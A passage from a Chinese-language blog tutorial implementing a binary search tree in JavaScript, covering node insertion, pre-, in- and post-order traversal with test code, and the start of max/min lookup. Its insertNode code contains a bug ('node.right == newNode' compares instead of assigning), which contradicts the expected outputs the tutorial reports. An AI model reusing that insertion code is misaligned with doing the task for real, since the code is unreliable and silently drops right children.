href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/3.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/3.png" alt="image-20200301191507181"></a></p><p><strong>insertNode()代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">//内部使用的insertNode方法:用于比较节点从左边插入还是右边插入</span></span><br><span class="line">      BinarySearchTree.prototype.insertNode = <span class="function"><span class="keyword">function</span>(<span class="params">node, newNode</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//当newNode.key &lt; node.key向左查找</span></span><br><span class="line"><span class="comment">/*----------------------分支1:向左查找--------------------------*/</span>      </span><br><span class="line">        <span class="keyword">if</span>(newNode.key &lt; node.key)&#123;</span><br><span class="line">          <span class="comment">//情况1：node无左子节点，直接插入</span></span><br><span class="line"><span class="comment">/*----------------------分支1.1--------------------------*/</span></span><br><span class="line">          <span class="keyword">if</span> (node.left == <span class="literal">null</span>) &#123;</span><br><span class="line">            node.left = newNode</span><br><span class="line">          <span class="comment">//情况2：node有左子节点，递归调用insertNode(),直到遇到无左子节点成功插入newNode后，不再符合该情况，也就不再调用insertNode()，递归停止。</span></span><br><span class="line"><span class="comment">/*----------------------分支1.2--------------------------*/</span></span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.insertNode(node.left, newNode)</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//当newNode.key &gt;= node.key向右查找</span></span><br><span class="line"><span class="comment">/*-----------------------分支2:向右查找--------------------------*/</span>        </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//情况1：node无右子节点，直接插入</span></span><br><span class="line"><span class="comment">/*-----------------------分支2.1--------------------------*/</span> </span><br><span class="line">          <span class="keyword">if</span>(node.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            node.right == newNode</span><br><span class="line">          <span class="comment">//情况2：node有右子节点，依然递归调用insertNode(),直到遇到无右子节点成功插入newNode为止</span></span><br><span class="line"><span class="comment">/*-----------------------分支2.2--------------------------*/</span> </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.insertNode(node.right, newNode)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>为了更好理解以下列二叉搜索树为例：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/4.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/4.png" alt="image-20200301193104003"></a></p><p>想要上述的二叉搜索树（蓝色）中插入数据10：</p><ul><li>先把key = 10 传入insert方法，由于存在根节点 9，所以直接调用insetNode方法，传入的参数：node = 9，newNode = 10；</li><li>由于10 &gt; 9，进入分支2，向右查找适合插入的位置；</li><li>由于根节点 9 的右子节点存在且为 13 ，所以进入分支2.2，递归调用insertNode方法，传入的参数：node = 13，newNode = 10；</li><li>由于 10 &lt; 13 ，进入分支1，向左查找适合插入的位置；</li><li>由于父节点 13 的左子节点存在且为11，所以进入分支1.2，递归调用insertNode方法，传入的参数：node = 11，newNode = 10；</li><li>由于 10 &lt; 11，进入分支1，向左查找适合插入的位置；</li><li>由于父节点 11 的左子节点不存在，所以进入分支1.1，成功插入节点 10 。由于不符合分支1.2的条件所以不会继续调用insertNode方法，递归停止。</li></ul><p><strong>测试代码：</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   //测试代码</span><br><span class="line">   //<span class="number">1.</span>创建BinarySearchTree</span><br><span class="line">   let <span class="keyword">bst</span> = new BinarySearchTree()</span><br><span class="line"></span><br><span class="line">   //<span class="number">2.</span>插入数据</span><br><span class="line">   <span class="keyword">bst</span>.insert(<span class="number">11</span>)<span class="comment">;</span></span><br><span class="line">   <span class="keyword">bst</span>.insert(<span class="number">7</span>)<span class="comment">;</span></span><br><span class="line">   <span class="keyword">bst</span>.insert(<span class="number">15</span>)<span class="comment">;</span></span><br><span class="line">   <span class="keyword">bst</span>.insert(<span class="number">5</span>)<span class="comment">;</span></span><br><span class="line">   <span class="keyword">bst</span>.insert(<span class="number">9</span>)<span class="comment">;</span></span><br><span class="line">console.log(<span class="keyword">bst</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>应得到下图所示的二叉搜索树：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/5.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/5.png" alt="image-20200302002708576"></a></p><p><strong>测试结果</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/6.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/6.png" alt="image-20200302002409735"></a></p><h4 id="2-遍历数据"><a href="#2-遍历数据" class="headerlink" title="2.遍历数据"></a>2.遍历数据</h4><p>这里所说的树的遍历不仅仅针对二叉搜索树，而是适用于所有的二叉树。由于树结构不是线性结构，所以遍历方式有多种选择，常见的三种二叉树遍历方式为：</p><ul><li>先序遍历；</li><li>中序遍历；</li><li>后序遍历；</li></ul><p>还有层序遍历，使用较少。</p><h5 id="2-1-先序遍历"><a href="#2-1-先序遍历" class="headerlink" title="2.1.先序遍历"></a>2.1.先序遍历</h5><p>先序遍历的过程为：</p><ul><li>首先，遍历根节点；</li><li>然后，遍历其左子树；</li><li>最后，遍历其右子树；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/7.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/7.png" alt="image-20200301213506159"></a></p><p>如上图所示，二叉树的节点遍历顺序为：A -&gt; B -&gt; D -&gt; H -&gt; I -&gt; E -&gt; C -&gt; F -&gt; G。</p><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//先序遍历</span></span><br><span class="line">      <span class="comment">//掺入一个handler函数方便之后对得到的key进行处理</span></span><br><span class="line">      BinarySearchTree.prototype.preOrderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">handler</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.preOrderTraversalNode(<span class="built_in">this</span>.root, handler)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//封装内部方法，对某个节点进行遍历</span></span><br><span class="line">      BinarySearchTree.prototype.preOrderTraversalNode = <span class="function"><span class="keyword">function</span>(<span class="params">node,handler</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">//1.处理经过的节点</span></span><br><span class="line">          handler(node.key)</span><br><span class="line"><span class="comment">/*----------------------递归1----------------------------*/</span></span><br><span class="line">          <span class="comment">//2.遍历左子树中的节点</span></span><br><span class="line">          <span class="built_in">this</span>.preOrderTraversalNode(node.left, handler)</span><br><span class="line"><span class="comment">/*----------------------递归2----------------------------*/</span></span><br><span class="line">          <span class="comment">//3.遍历右子树中的节点</span></span><br><span class="line">          <span class="built_in">this</span>.preOrderTraversalNode(node.right, handler)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>以遍历以下二叉搜索树为例：</p><p>[<img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/8.png" alt="image-20200301221450001">](<a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/8.png">https://gitee.com/ahuntsun/BlogImgs/raw/master/数据结构与算法/树二/8.png</a></p><p>首先调用preOrderTraversal方法，在方法里再调用preOrderTraversalNode方法用于遍历二叉搜索树。在preOrderTraversalNode方法中，递归1负责遍历左子节点，递归2负责遍历右子节点。先执行递归1，执行过程如下图所示：</p><blockquote><p><strong>记：preOrderTraversalNode() 为 A()</strong></p></blockquote><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/9.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/9.png" alt="image-20200302000248291"></a></p><p>可以看到一共递归调用了4次方法A，分别传入11、7、5、3，最后遇到null不满足 node != null 条件结束递归1；注意此时只是执行完最开始的递归1，并没有执行递归2，并且递归1执行到null停止后要一层层地往上返回，按顺序将调用的函数压出函数调用栈。</p><p>关于函数调用栈：之前的四次递归共把4个函数压入了函数调用栈，现在递归执行完了一层层地把函数压出栈。</p><p>值得注意的是：每一层函数都只是执行完了递归1，当返回到该层函数时，比如A（3）要继续执行递归2遍历二叉搜索树中的右子节点；</p><p>在执行递归2的过程中会不断调用方法A，并依次执行递归1和递归2，以此类推直到遇到null不满足 node != null 条件为止，才停止递归并一层层返回，如此循环。同理A（5）层、A（7）层、A（11）层都要经历上述循环，直到将二叉搜索树中的节点全部遍历完为止。</p><p>具体过程如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/10.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/10.png" alt="image-20200302000007414"></a></p><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="comment">//1.创建BinarySearchTree</span></span><br><span class="line"><span class="keyword">let</span> bst = <span class="keyword">new</span> BinarySearchTree()</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.插入数据</span></span><br><span class="line">bst.insert(<span class="number">11</span>);</span><br><span class="line">bst.insert(<span class="number">7</span>);</span><br><span class="line">bst.insert(<span class="number">15</span>);</span><br><span class="line">bst.insert(<span class="number">5</span>);</span><br><span class="line">bst.insert(<span class="number">3</span>);</span><br><span class="line">bst.insert(<span class="number">9</span>);</span><br><span class="line">bst.insert(<span class="number">8</span>);</span><br><span class="line">bst.insert(<span class="number">10</span>);</span><br><span class="line">bst.insert(<span class="number">13</span>);</span><br><span class="line">bst.insert(<span class="number">12</span>);</span><br><span class="line">bst.insert(<span class="number">14</span>);</span><br><span class="line">bst.insert(<span class="number">20</span>);</span><br><span class="line">bst.insert(<span class="number">18</span>);</span><br><span class="line">bst.insert(<span class="number">25</span>);</span><br><span class="line">bst.insert(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试遍历</span></span><br><span class="line"><span class="keyword">let</span> resultString = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">//掺入处理节点值的处理函数</span></span><br><span class="line">bst.preOrderTraversal(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">  resultString += key + <span class="string">&quot;-&gt;&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">alert(resultString)</span><br></pre></td></tr></table></figure><p>应输出这样的顺序：11 -&gt; 7 -&gt; 5 -&gt; 3 -&gt; 6 -&gt; 9 -&gt; 8 -&gt; 10 -&gt; 15 -&gt; 13 -&gt;12 -&gt; 14 -&gt; 20 -&gt; 18 -&gt; 25 。</p><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/11.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/11.png" alt="image-20200302003244874"></a></p><h5 id="2-2-中序遍历"><a href="#2-2-中序遍历" class="headerlink" title="2.2.中序遍历"></a>2.2.中序遍历</h5><p>实现思路：与先序遍历原理相同，只不过是遍历的顺序不一样了。</p><ul><li>首先，遍历其左子树；</li><li>然后，遍历根（父）节点；</li><li>最后，遍历其右子树；</li></ul><p><strong>代码实现：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;中序遍历</span><br><span class="line">BinarySearchTree.prototype.midOrderTraversal &#x3D; function(handler)&#123;</span><br><span class="line">  this.midOrderTraversalNode(this.root, handler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BinarySearchTree.prototype.midOrderTraversalNode &#x3D; function(node, handler)&#123;</span><br><span class="line">  if (node !&#x3D; null) &#123;</span><br><span class="line">    &#x2F;&#x2F;1.遍历左子树中的节点</span><br><span class="line">    this.midOrderTraversalNode(node.left, handler)</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;2.处理节点</span><br><span class="line">    handler(node.key)</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;3.遍历右子树中的节点</span><br><span class="line">    this.midOrderTraversalNode(node.right, handler)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>遍历的顺序应如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/12.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/12.png" alt="image-20200302112920295"></a></p><p>首先调用midOrderTraversal方法，在方法里再调用midOrderTraversalNode方法用于遍历二叉搜索树。先使用递归1遍历左子树中的节点；然后，处理父节点；最后，遍历右子树中的节点。</p><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line">  <span class="comment">//1.创建BinarySearchTree</span></span><br><span class="line">  <span class="keyword">let</span> bst = <span class="keyword">new</span> BinarySearchTree()</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.插入数据</span></span><br><span class="line">  bst.insert(<span class="number">11</span>);</span><br><span class="line">  bst.insert(<span class="number">7</span>);</span><br><span class="line">  bst.insert(<span class="number">15</span>);</span><br><span class="line">  bst.insert(<span class="number">5</span>);</span><br><span class="line">  bst.insert(<span class="number">3</span>);</span><br><span class="line">  bst.insert(<span class="number">9</span>);</span><br><span class="line">  bst.insert(<span class="number">8</span>);</span><br><span class="line">  bst.insert(<span class="number">10</span>);</span><br><span class="line">  bst.insert(<span class="number">13</span>);</span><br><span class="line">  bst.insert(<span class="number">12</span>);</span><br><span class="line">  bst.insert(<span class="number">14</span>);</span><br><span class="line">  bst.insert(<span class="number">20</span>);</span><br><span class="line">  bst.insert(<span class="number">18</span>);</span><br><span class="line">  bst.insert(<span class="number">25</span>);</span><br><span class="line">  bst.insert(<span class="number">6</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//3.测试中序遍历</span></span><br><span class="line">  <span class="keyword">let</span> resultString2 =<span class="string">&quot;&quot;</span></span><br><span class="line">  bst.midOrderTraversal(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">    resultString2 += key + <span class="string">&quot;-&gt;&quot;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  alert(resultString2)</span><br></pre></td></tr></table></figure><p>输出节点的顺序应为：3 -&gt; 5 -&gt; 6 -&gt; 7 -&gt; 8 -&gt; 9 -&gt; 10 -&gt; 11 -&gt; 12 -&gt; 13 -&gt; 14 -&gt; 15 -&gt; 18 -&gt; 20 -&gt; 25 。</p><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/13.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/13.png" alt="image-20200302112326786"></a></p><h5 id="2-3-后续遍历"><a href="#2-3-后续遍历" class="headerlink" title="2.3.后续遍历"></a>2.3.后续遍历</h5><p>实现思路：与先序遍历原理相同，只不过是遍历的顺序不一样了。</p><ul><li>首先，遍历其左子树；</li><li>然后，遍历其右子树；</li><li>最后，遍历根（父）节点；</li></ul><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line">BinarySearchTree.prototype.postOrderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">handler</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.postOrderTraversalNode(<span class="built_in">this</span>.root, handler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BinarySearchTree.prototype.postOrderTraversalNode = <span class="function"><span class="keyword">function</span>(<span class="params">node, handler</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//1.遍历左子树中的节点</span></span><br><span class="line">    <span class="built_in">this</span>.postOrderTraversalNode(node.left, handler)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2.遍历右子树中的节点</span></span><br><span class="line">    <span class="built_in">this</span>.postOrderTraversalNode(node.right, handler)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.处理节点</span></span><br><span class="line">    handler(node.key)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>遍历的顺序应如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/14.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/14.png" alt="image-20200302120246366"></a></p><p>首先调用postOrderTraversal方法，在方法里再调用postOrderTraversalNode方法用于遍历二叉搜索树。先使用递归1遍历左子树中的节点；然后，遍历右子树中的节点；最后，处理父节点。</p><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="comment">//1.创建BinarySearchTree</span></span><br><span class="line"><span class="keyword">let</span> bst = <span class="keyword">new</span> BinarySearchTree()</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.插入数据</span></span><br><span class="line">bst.insert(<span class="number">11</span>);</span><br><span class="line">bst.insert(<span class="number">7</span>);</span><br><span class="line">bst.insert(<span class="number">15</span>);</span><br><span class="line">bst.insert(<span class="number">5</span>);</span><br><span class="line">bst.insert(<span class="number">3</span>);</span><br><span class="line">bst.insert(<span class="number">9</span>);</span><br><span class="line">bst.insert(<span class="number">8</span>);</span><br><span class="line">bst.insert(<span class="number">10</span>);</span><br><span class="line">bst.insert(<span class="number">13</span>);</span><br><span class="line">bst.insert(<span class="number">12</span>);</span><br><span class="line">bst.insert(<span class="number">14</span>);</span><br><span class="line">bst.insert(<span class="number">20</span>);</span><br><span class="line">bst.insert(<span class="number">18</span>);</span><br><span class="line">bst.insert(<span class="number">25</span>);</span><br><span class="line">bst.insert(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试后序遍历</span></span><br><span class="line"><span class="keyword">let</span> resultString3 =<span class="string">&quot;&quot;</span></span><br><span class="line">bst.postOrderTraversal(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">  resultString3 += key + <span class="string">&quot;-&gt;&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">alert(resultString3)</span><br></pre></td></tr></table></figure><p>输出节点的顺序应为：3 -&gt; 6 -&gt; 5 -&gt; 8 -&gt; 10 -&gt; 9 -&gt; 7 -&gt; 12 -&gt; 14 -&gt; 13 -&gt; 18 -&gt; 25 -&gt; 20 -&gt; 15 -&gt; 11 。</p><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/15.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/15.png" alt="image-20200302115446608"></a></p><p><strong>总结：</strong>以遍历根（父）节点的顺序来区分三种遍历方式。比如：先序遍历先遍历根节点、中序遍历第二遍历根节点、后续遍历最后遍历根节点。</p><h4 id="3-查找数据"><a href="#3-查找数据" class="headerlink" title="3.查找数据"></a>3.查找数据</h4><h5 id="3-1-查找最大值-amp-最小值"><a href="#3-1-查找最大值-amp-最小值" class="headerlink" title="3.1.查找最大值&amp;最小值"></a>3.1.查找最大值&amp;最小值</h5><p>在二叉搜索树中查找最值非常简单，最小值在二叉搜索树的最左边，最大值在二叉搜索树的最右边。只需要一直向左/右查找就能得到最值，如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/16.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/16.png" alt="image-20200302125521501"></a></p><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//寻找最大值</span></span><br><span class="line">BinarySearchTree.prototype.max = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//1.获取根节点</span></span><br><span class="line">  <span class="keyword">let</span> node = <span class="built_in">this</span>.root</span><br><span class="line">  <span class="comment">//2.定义key保存节点值</span></span><br><span class="line">  <span class="keyword">let</span> key = <span class="literal">null</span></span><br><span class="line">  <span class="comment">//3.依次向右不断查找，直到节点为null</span></span><br><span class="line">  <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">    key = node.key</span><br><span class="line">    node = node.right</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找最小值</span></span><br><span class="line">BinarySearchTree.prototype.min = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//1.获取根节点</span></span><br><span class="line">   <span class="keyword">let</span> node 